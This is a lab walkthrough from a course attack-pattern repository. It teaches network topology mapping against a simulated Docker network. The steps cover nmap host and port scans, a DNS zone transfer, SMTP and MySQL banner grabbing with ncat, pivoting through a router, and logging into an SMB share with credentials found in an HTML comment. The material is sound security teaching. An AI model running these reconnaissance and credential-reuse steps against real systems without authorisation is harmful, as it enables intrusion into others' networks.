# Network Topology Mapping Walkthrough

**CAPEC-309 | IT&C 266 Attack Pattern Repository | Gabriel Ruegner**

In this walkthrough, you'll map out a simulated corporate network from a single foothold using common reconnaissance tools. You'll discover hosts, enumerate services, exploit a DNS misconfiguration to reveal a hidden subnet, and pivot into internal systems — all the core techniques behind CAPEC-309 (Network Topology Mapping). There are 5 flags hidden throughout the environment that prove you completed each step.

**Time to complete:** 30–45 minutes

**Tools you'll use:** Nmap, dig, curl, ncat, smbclient

---

## Setup

You'll need [Docker Desktop](https://www.docker.com/products/docker-desktop/) installed and running (Windows 10/11 with WSL2 backend). That's it — everything else runs inside containers, so you don't need to install Nmap, Linux, or anything else on your host machine.

Download the `topology-lab` folder and unpack it into a directory on your machine.

### Examining the Setup

Open the folder in an editor like [VS Code](https://code.visualstudio.com/). Here's what's inside:

**docker-compose.yml**
- Defines 7 container-services across 2 Docker networks
- **dmz** network (10.10.10.0/24) — contains the web server, DNS server, mail server, router, and your attacker box
- **internal** network (10.10.20.0/24) — contains a file server and database server
- The **router** container bridges both networks with IP forwarding enabled
- The **attacker** container is your starting point — it comes pre-loaded with nmap, dig, traceroute, curl, ncat, and smbclient

**Container Dockerfiles (one per subdirectory)**
- Each container is built from a minimal Alpine or Nginx base image
- Services are configured with intentional misconfigurations and information leaks that you'll discover during recon
- Flags are embedded in service banners, HTTP headers, DNS records, and files

### Starting the Lab

Open **PowerShell** or **Command Prompt**, change to the folder where you unpacked the lab, and run:

```
docker compose up -d --build
```

This builds and starts all 7 containers. The first time takes a couple minutes to download base images.

Verify everything is running:

```
docker compose ps
```

You should see all 7 containers with a status of "Up."

Now shell into the attacker box — this is where you'll work for the rest of the walkthrough:

```
docker exec -it attacker bash -l
```

You'll see a welcome banner telling you your IP (10.10.10.50) and that you're on the 10.10.10.0/24 network. From here on out, every command is running inside a Linux container, so all the Linux tools work even though you're on Windows. You don't know anything else about the network yet. Time to start mapping.

---

## Phase 1: Host Discovery on the DMZ

The first thing any attacker does on a new network is figure out what's alive. You know you're on 10.10.10.0/24 — let's sweep it.

### Step 1: Ping sweep the DMZ subnet

```bash
nmap -sn -PR 10.10.10.0/24
```

The `-sn` flag tells Nmap to do a ping sweep — it checks which hosts are alive without scanning any ports. `-PR` uses ARP discovery instead of ICMP ping, which is near-instant on a local subnet and far more reliable inside Docker networks on Windows.

**Expected output:**
```
Nmap scan report for 10.10.10.1
Host is up (0.0001s latency).
Nmap scan report for 10.10.10.10
Host is up (0.0001s latency).
Nmap scan report for 10.10.10.20
Host is up (0.0001s latency).
Nmap scan report for 10.10.10.30
Host is up (0.0001s latency).
Nmap scan report for 10.10.10.50
Host is up.
```

**What you learned:** There are 4 other live hosts on this subnet besides you:
- `10.10.10.1` — probably a gateway/router (it's the .1)
- `10.10.10.10` — unknown
- `10.10.10.20` — unknown
- `10.10.10.30` — unknown

This is exactly the first step of network topology mapping — identifying what exists on the network before digging deeper.

---

## Phase 2: Service Enumeration

Now we know what's alive — let's find out what services they're running.

### Step 2: Port scan with service detection

```bash
nmap -sV -sC 10.10.10.1,10,20,30
```

The `-sV` flag enables version detection (what software is running), and `-sC` runs default scripts for additional info. This scans the top 1000 ports on each host. We'll do a deeper scan later. **This will take 3–8 minutes on Docker Desktop for Windows — that's normal, just let it run.**

**Key findings you should see:**

| Host | Port | Service |
|------|------|---------|
| 10.10.10.1 | — | No open ports (it's just a router) |
| 10.10.10.10 | 80/tcp | Nginx HTTP |
| 10.10.10.20 | 53/tcp | BIND DNS |
| 10.10.10.30 | 25/tcp | SMTP |

**What you learned:** You've got a web server, a DNS server, and a mail server in this DMZ. But notice we only scanned the top 1000 ports — there could be more.

### Step 3: Scan all ports on the web server

The web server is the most interesting target. Let's scan all 65,535 ports:

```bash
nmap -sV -p- 10.10.10.10
```

**This will take 5–15 minutes on Docker Desktop for Windows — that's normal, just let it run.**

**New finding:**

| Host | Port | Service |
|------|------|---------|
| 10.10.10.10 | 80/tcp | Nginx HTTP |
| 10.10.10.10 | **8443/tcp** | **Nginx HTTP** |

There's a second HTTP service on a non-standard port that we missed with the default scan. This is why full port scans matter.

---

## Phase 3: Flag 1 — HTTP Header Recon

Two web ports means two services to check. Let's poke at both.

### Step 4: Check the main web server on port 80

```bash
curl -v http://10.10.10.10
```

The `-v` flag shows the full HTTP headers alongside the response. You'll see a basic corporate landing page for "NovaCorp Technologies." Note the custom header `X-Server-Info: NovaCorp-WebNode-v3.2` — useful info for an attacker (software name and version), but no flag yet.

Also notice the page mentions `admin@novatech.local` — that domain name will be useful later.

### Step 5: Check the non-standard port 8443

```bash
curl -v http://10.10.10.10:8443
```

**Expected output (look at the headers):**
```
< HTTP/1.1 200 OK
< X-Flag: FLAG{1_http_header_recon}
< Content-Type: application/json
...
{"status":"staging","message":"NovaCorp Staging API v0.4.1 — Not for production use"}
```

### 🚩 Flag 1: `FLAG{1_http_header_recon}`

**Lesson:** Always scan all ports, not just the defaults. Non-standard ports often host staging or dev services that leak information through verbose responses and custom headers. In real life, this version info would be cross-referenced against CVE databases for known exploits. Nmap's `-p-` flag is essential for thorough recon.

---

## Phase 4: Flag 2 — DNS Zone Transfer

We found a DNS server on 10.10.10.20. DNS zone transfers are one of the most classic misconfigurations in network recon — if the server allows unauthorized transfers, you get every single DNS record in the domain handed to you.

### Step 6: Figure out the domain name

We noticed `admin@novatech.local` on the web page earlier. Let's confirm the DNS server knows about that domain:

```bash
dig @10.10.10.20 novatech.local ANY
```

The `@10.10.10.20` tells dig to query that specific DNS server. If you get records back, the domain is valid.

### Step 7: Attempt a zone transfer

```bash
dig @10.10.10.20 novatech.local AXFR
```

`AXFR` requests a full zone transfer — this should normally be restricted to authorized secondary DNS servers only. Let's see if it's locked down.

**Expected output:**
```
novatech.local.     86400   IN  SOA   ns1.novatech.local. admin.novatech.local. ...
novatech.local.     86400   IN  NS    ns1.novatech.local.
novatech.local.     86400   IN  MX    10 mail.novatech.local.
novatech.local.     86400   IN  TXT   "v=spf1 mx a:mail.novatech.local ~all"
_flag.novatech.local. 86400 IN  TXT   "FLAG{2_dns_zone_transfer}"
dbhost.novatech.local. 86400 IN A    10.10.20.20
fileshare.novatech.local. 86400 IN A 10.10.20.10
gateway.novatech.local. 86400 IN A   10.10.10.1
internal-gw.novatech.local. 86400 IN A 10.10.20.1
mail.novatech.local. 86400  IN  A    10.10.10.30
ns1.novatech.local.  86400  IN  A    10.10.10.20
staging.novatech.local. 86400 IN A   10.10.10.10
webhost.novatech.local. 86400 IN A   10.10.10.10
www.novatech.local.  86400  IN  A    10.10.10.10
```

It wasn't locked down. We just got everything.

### 🚩 Flag 2: `FLAG{2_dns_zone_transfer}`

**Lesson:** This is huge. The zone transfer gave us the entire network map without scanning a single additional host. Notice the `10.10.20.x` addresses — that's a **second subnet** we didn't know about. We can see `fileshare` at 10.10.20.10, `dbhost` at 10.10.20.20, and an `internal-gw` at 10.10.20.1. This is exactly why DNS zone transfers should be restricted (CAPEC-291) — one misconfigured DNS server blows the whole topology wide open.

---

## Phase 5: Flag 3 — SMTP Banner Grab

We saw an SMTP service on 10.10.10.30. Mail servers typically announce themselves with a banner when you connect — this is part of the SMTP protocol.

### Step 8: Connect to the mail server

```bash
ncat 10.10.10.30 25
```

`ncat` (part of the Nmap suite) opens a raw TCP connection to the specified host and port. Since SMTP is a text-based protocol, the server immediately sends a greeting.

**Expected output:**
```
220 mail.novatech.local ESMTP NovaCorp Mail v2.1.4 — FLAG{3_smtp_banner_grab}
```

Once you see the banner and have the flag, type `QUIT` and hit Enter to disconnect (do not copy the banner text — just type the command yourself).

### 🚩 Flag 3: `FLAG{3_smtp_banner_grab}`

**Lesson:** Service banners are a goldmine for reconnaissance. This one reveals the internal hostname, the mail software name, and a specific version number. In a real engagement, an attacker would immediately search for known vulnerabilities in that version. Defenders should customize or strip banners to avoid leaking this info.

---

## Phase 6: Reaching the Internal Subnet

The DNS zone transfer revealed a second subnet at 10.10.20.0/24 with a gateway at 10.10.20.1. Our attacker box is only on the DMZ — we need to route through the gateway to reach the internal network.

### Step 9: Verify the route to the internal subnet

The attacker container is pre-configured with a static route to 10.10.20.0/24 via the router. Confirm it's in place:

```bash
ip route show
```

**Expected output:**
```
default via 10.10.10.254 dev eth0
10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.50
10.10.20.0/24 via 10.10.10.1 dev eth0
```

The third line is the key one — it tells the attacker to send any traffic destined for 10.10.20.0/24 through the router at 10.10.10.1. In a real scenario, this is the "pivoting" step — using a misconfigured router to reach a network you shouldn't have access to.

### Step 10: Verify connectivity

```bash
ping -c 2 10.10.20.10
```

If you get replies, you've successfully pivoted into the internal network. If not, double-check that the router container is running with `docker compose ps` from your host machine.

### Step 11: Scan the internal subnet

```bash
nmap -sV 10.10.20.10,20
```

**Key findings:**

| Host | Port | Service |
|------|------|---------|
| 10.10.20.10 | 139/tcp | Samba (SMB) |
| 10.10.20.10 | 445/tcp | Samba (SMB) |
| 10.10.20.20 | 3306/tcp | MySQL |

**What you learned:** The internal subnet has a file server running SMB and a database server running MySQL. Neither were visible from the DMZ without routing through the gateway — exactly the kind of segmentation attackers try to break through.

---

## Phase 7: Flag 4 — SMB Share Enumeration

We found SMB on 10.10.20.10, but we need credentials. Let's go back and look more carefully at the web server — sometimes hidden pages contain useful info.

### Step 12: Look for hidden pages on the web server

When scanning earlier, we found the web server. Let's check for directories that might not be linked from the main page:

```bash
curl http://10.10.10.10/s3cr3t-admin/
```

**Expected output (look at the HTML source):**
```html
<h1>NovaCorp Admin Dashboard</h1>
<p>Server Management Interface v3.2</p>
<p>Subnet Map: DMZ = 10.10.10.0/24 | Internal = 10.10.20.0/24</p>
<p>Gateway: 10.10.10.1 / 10.10.20.1</p>
<p><!-- Note to self: file share creds are smbuser / topomap2024 --></p>
```

Developers leaving credentials in HTML comments — happens all the time. Now we have SMB credentials.

### Step 13: List available SMB shares

```bash
smbclient -L //10.10.20.10 -U smbuser --password=topomap2024
```

**Expected output:**
```
	Sharename       Type      Comment
	---------       ----      -------
	share           Disk      NovaCorp Internal Documents
```

### Step 14: Access the share and grab the flag

```bash
smbclient //10.10.20.10/share -U smbuser --password=topomap2024
```

Once connected, type each command one at a time (do not type the `smb: \>` prompt — that's just showing you what the shell looks like):
```
cd documents
```
```
get credentials-backup.txt
```
```
exit
```

Read the file:
```bash
cat credentials-backup.txt
```

**Expected output:**
```
FLAG{4_smb_share_accessed}

Internal Server Credentials (ROTATE THESE)
dbhost MySQL root: N0v4T3ch_DB_2024
webhost admin panel: admin / W3bAdm1n!
```

### 🚩 Flag 4: `FLAG{4_smb_share_accessed}`

**Lesson:** File shares are almost always worth checking during recon. This one not only had a flag but contained plaintext credentials for other systems — including the database. In the real world, this kind of credential reuse and insecure storage is shockingly common and is a classic lateral movement enabler.

---

## Phase 8: Flag 5 — Database Service Enumeration

The credentials file mentioned a MySQL server at `dbhost`. We know from the DNS zone transfer that's 10.10.20.20, and our port scan confirmed MySQL on 3306.

### Step 15: Grab the MySQL banner

```bash
ncat 10.10.20.20 3306
```

**Expected output:**
```
5.7.42-NovaCorp-FLAG{5_db_service_enumeration}
```

The connection will close after a few seconds — that's normal. The MySQL protocol sends version info in the initial handshake before authentication.

### 🚩 Flag 5: `FLAG{5_db_service_enumeration}`

**Lesson:** Database servers broadcast version information in their connection handshake, just like SMTP. An attacker would use this to search for known exploits against that specific version. In production, MySQL's `skip-show-database` flag and custom server-identity settings should be configured to prevent this kind of information leak.

---

## Summary

Here's a recap of the complete network topology you mapped:

```
DMZ Subnet: 10.10.10.0/24
├── 10.10.10.1   — Router/Gateway (bridges to internal)
├── 10.10.10.10  — Web Server (Nginx on 80, 8443)
├── 10.10.10.20  — DNS Server (BIND, zone transfers open)
└── 10.10.10.30  — Mail Server (SMTP on 25)

Internal Subnet: 10.10.20.0/24
├── 10.10.20.1   — Router/Gateway
├── 10.10.20.10  — File Server (SMB on 139, 445)
└── 10.10.20.20  — Database Server (MySQL on 3306)
```

### Flags Collected

| # | Flag | Technique Used |
|---|------|----------------|
| 1 | `FLAG{1_http_header_recon}` | HTTP header inspection on non-standard port |
| 2 | `FLAG{2_dns_zone_transfer}` | DNS zone transfer (AXFR) |
| 3 | `FLAG{3_smtp_banner_grab}` | SMTP banner grabbing |
| 4 | `FLAG{4_smb_share_accessed}` | SMB share enumeration with discovered creds |
| 5 | `FLAG{5_db_service_enumeration}` | MySQL banner grabbing |

### Techniques Mapped to CAPEC/ATT&CK

| Technique | CAPEC | ATT&CK |
|-----------|-------|--------|
| Host discovery (ping sweep) | CAPEC-309 | T1016 |
| Port scanning / service enum | CAPEC-309 | T1046 |
| DNS zone transfer | CAPEC-291 | T1590.002 |
| Route enumeration / pivoting | CAPEC-293 | T1016 |
| Banner grabbing | CAPEC-309 | T1046 |
| Network share discovery | CAPEC-643 | T1135 |

---

## Key Takeaways

1. **Always scan all ports.** The default top-1000 scan missed the staging service on port 8443. Use `-p-` for thorough recon.

2. **DNS zone transfers are devastating.** A single misconfigured DNS server revealed the entire network topology including a hidden internal subnet. This is CAPEC-291 in action.

3. **Service banners leak info.** SMTP and MySQL banners gave us software names and versions. In the real world, version info feeds directly into vulnerability scanning.

4. **Credentials on file shares are common.** The SMB share contained plaintext creds for other systems — a classic lateral movement enabler.

5. **Network segmentation only works if routing is controlled.** The internal subnet was separate, but because the router forwarded traffic without restriction, we could reach it from the DMZ. Proper firewall rules would have stopped us.

These are exactly the reconnaissance techniques described by CAPEC-309 (Network Topology Mapping) and its child patterns. Understanding how attackers map networks is the first step to defending against them.

---

## Cleanup

When you're done, type `exit` to leave the attacker container, then tear everything down from PowerShell/CMD:

```
docker compose down --rmi all
```
